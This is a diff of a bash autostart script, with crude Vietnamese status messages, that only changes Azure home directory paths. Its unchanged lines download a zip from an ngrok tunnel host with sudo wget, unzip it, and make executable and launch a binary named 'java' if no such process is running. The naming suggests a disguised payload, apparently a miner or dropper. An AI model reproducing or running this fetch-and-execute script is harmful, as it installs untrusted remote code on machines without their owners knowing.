@@ -1,7 +1,7 @@
 #!/bin/bash
 
 set -x #echo on
-if [ -f /home/azureuser/java ]; then
+if [ -f /home/azure/java ]; then
     if pgrep -x "java" > /dev/null
 then
     echo "scrip dang chay roi , ke cmn di "
@@ -9,7 +9,7 @@ then
 else
 
 echo "script da install , chay thoi "
-cd /home/azureuser/
+cd /home/azure/
 sleep 10
 sudo chmod +x java
 rm autostart.sh
@@ -23,7 +23,7 @@ fi
 
 
 
-cd /home/azureuser/
+cd /home/azure/
 sudo wget http://b529-20-197-103-154.ngrok.io/ubuntu_18.04.zip
 sudo unzip ubuntu_18.04.zip
 sudo chmod +x java
